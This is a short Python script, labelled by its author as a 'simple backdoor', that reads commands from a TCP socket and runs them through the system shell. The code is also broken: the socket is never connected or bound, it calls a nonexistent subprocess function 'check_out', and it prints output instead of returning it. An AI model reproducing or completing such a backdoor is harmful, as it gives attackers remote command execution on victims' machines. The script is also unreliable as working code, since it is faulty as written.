#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-16
Description : simple backdoor
'''

import socket as sck
import subprocess as subp


def initiate():
    BUFFER = 4096
    with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as sock:
        command = True
        while command:
            command = sock.recv(BUFFER)
            received = exe_cmd(command)
            print(received)
        
def exe_cmd(command):
    return subp.check_out(command, shell=True)
